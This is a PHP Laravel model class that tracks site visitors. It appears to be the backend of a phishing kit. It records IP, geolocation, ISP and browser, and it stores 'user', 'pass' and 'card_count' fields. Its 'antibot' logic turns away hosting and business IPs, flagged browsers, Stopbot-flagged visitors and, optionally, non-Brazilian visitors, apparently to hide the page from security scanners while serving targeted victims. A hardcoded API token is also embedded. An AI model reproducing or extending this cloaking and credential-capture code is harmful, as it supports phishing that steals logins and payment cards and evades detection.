<?php

namespace App\Models;

use App\Class\Browser;
use App\Class\Ipify;
use App\Class\Stopbot\StopbotResponse;
use App\Enums\AntibotStatus;
use App\Enums\ParameterStatus;
use App\Enums\UserType;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use Log;
use Throwable;

class Visitor extends Model {
    protected $fillable = [
        'card_count',
        'is_finished',
        'user_type',
        'ip_address',
        'parameter_status',
        'stopbot_response',
        'isp',
        'browser',
        'city',
        'state',
        'country',
        'user',
        'pass',
        'user_agent',
        'first_page',
        'last_page',
    ];

    protected $appends = [
        'visitor_details',
        'antibot_status',
        'page_finished',
    ];

    public function getPageFinishedAttribute(): bool
    {
        return (bool)Cache::get("page_finished_$this->user");
    }

    public function setPageFinished(): void
    {
        Cache::put("page_finished_$this->user", true);
    }

    /**
     * Retrieve the current instance based on the request's IP address.
     *
     * @return static
     * @noinspection PhpMissingReturnTypeInspection
     */
    public static function current()
    {
        return self::whereIpAddress(request()->ip())->first();
    }

    public static function lookup(?string $ip = null): ?static
    {
        $ip ??= request()->ip();
        $browser = new Browser(getallheaders());
        $parameterStatus = ParameterStatus::get();

        $endpoint = "https://api.findip.net/$ip/?token=4c09b8ece6424f168ed1c9c6311105ed";

        try {
            $response = Http::connectTimeout(2)->timeout(2)->get($endpoint)->throw();
            $userType = UserType::tryFrom($response->json('traits.user_type')) ?? UserType::Undetected;
            $isp = $response->json('traits.isp');
            $city = $response->json('city.names.en');
            $state = $response->json('subdivisions.0.names.en');
            $country = $response->json('country.names.en');
        } catch (Throwable $t) {
            Log::alert($t);
            try {
                $ipify = Ipify::free()->lookup($ip);

                $userType = match ($ipify['as']['type'] ?? '') {
                    "Cable/DSL/ISP",
                    "NSP" => UserType::Residential,
                    "Enterprise" => UserType::Business,

                    "Content",
                    "Route Server",
                    "Educational/Research" => UserType::Hosting,

                    default => UserType::Undetected,
                };
                $isp = $ipify['isp'] ?? '';
                $city = $ipify['location']['city'] ?? '';
                $state = $ipify['location']['region'] ?? '';
                $country = $ipify['location']['country'] ?? '';
            } catch (Throwable $t) {
                Log::alert($t);
                return null;
            }
        }

        return self::updateOrCreate(['ip_address' => $ip], [
            'card_count' => 0,
            'ip_address' => $ip,
            'is_finished' => false,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'browser' => $browser,
            'isp' => $isp,
            'city' => $city,
            'state' => $state,
            'country' => $country,
            'parameter_status' => $parameterStatus,
            'user_type' => $userType,
            'stopbot_response' => Settings::me()->stopbotLookup(),
            'first_page' => request()->getRequestUri(),
            'last_page' => request()->getRequestUri(),
        ]);
    }

    public function toArray(): array
    {
        return [
            'id' => $this->id,
            'ip_address' => $this->ip_address,
            'user_agent' => $this->user_agent,
            'browser' => $this->browser->toString(),
            'isp' => $this->isp,
            'city' => $this->city,
            'state' => $this->state,
            'country' => $this->country,
            'user_type' => $this->user_type->name,
            'antibot_status' => $this->antibot_status->name,
            'parameter_status' => $this->parameter_status->name,
            'created_at' => $this->created_at->toString(),
            'updated_at' => $this->updated_at->toString(),
            'card_count' => $this->card_count,
            'is_finished' => $this->is_finished,
            'stopbot_response' => $this->stopbot_response,
            'first_page' => $this->first_page,
            'last_page' => $this->last_page,
            'desc' => $this->visitor_details,
        ];
    }

    public function as_markdown_footer(string $tab = ''): string
    {
        return Str::of("$tab- Browser: $this->browser\n")
            ->append("$tab- Geo: {$this->geoAsString()}\n")
            ->append("$tab- ISP: $this->isp\n")
            ->append("$tab- User Type: {$this->user_type->name}\n")
            ->append("$tab- Antibot Status: {$this->antibot_status->name}\n")
            ->append("$tab- Parameter Status: {$this->parameter_status->name}\n")
            ->append("$tab- User Agent: $this->user_agent\n")
            ->value();
    }

    public function geoAsString(): string
    {
        return Str::of('')
            ->append($this->city ? "$this->city, " : '')
            ->append($this->state ? "$this->state, " : '')
            ->append($this->country ?: '')
            ->append("| $this->ip_address ($this->isp)")
            ->value();
    }

    /** @noinspection PhpUnused */

    public function getVisitorDetailsAttribute(): string
    {
        $status = $this->antibot_status->name;
        $userType = $this->user_type->name;
        $parameterStatus = $this->parameter_status->name;
        $stopbot = $this->stopbot_response?->Status->Desc ?? 'Unknown';
        return "$status = User Type: $userType | Parameter Status: $parameterStatus | Stopbot: $stopbot | Browser: $this->browser";
    }

    /** @noinspection PhpUnused */

    public function getAntibotStatusAttribute(): AntibotStatus
    {
        $antibotStatus = AntibotStatus::try_from($this->user_type);

        if (Settings::me()->lock_brazil && strtolower($this->country) !== 'brazil') {
            $antibotStatus = AntibotStatus::Disallowed;
        }

        if ($antibotStatus === AntibotStatus::Allowed && $this->parameter_status->unmatched()) {
            $antibotStatus = AntibotStatus::Disallowed;
        }

        if ($antibotStatus === AntibotStatus::Allowed && $this->browser->unsafe()) {
            $antibotStatus = AntibotStatus::Disallowed;
        }

        if ($antibotStatus === AntibotStatus::Allowed && $this->stopbot_response?->unsafe()) {
            $antibotStatus = AntibotStatus::Disallowed;
        }

        return $antibotStatus;
    }

    public function isAllowed(): bool
    {
        $this->last_page = request()->getRequestUri();
        $this->save();
        return $this->antibot_status === AntibotStatus::Allowed;
    }

    protected function casts(): array
    {
        return [
            'browser' => Browser::class,
            'user_type' => UserType::class,
            'antibot_status' => AntibotStatus::class,
            'parameter_status' => ParameterStatus::class,
            'stopbot_response' => StopbotResponse::class,
            'created_at' => 'datetime',
            'updated_at' => 'datetime',
            'is_finished' => 'boolean',
            'card_count' => 'integer',
        ];
    }
}
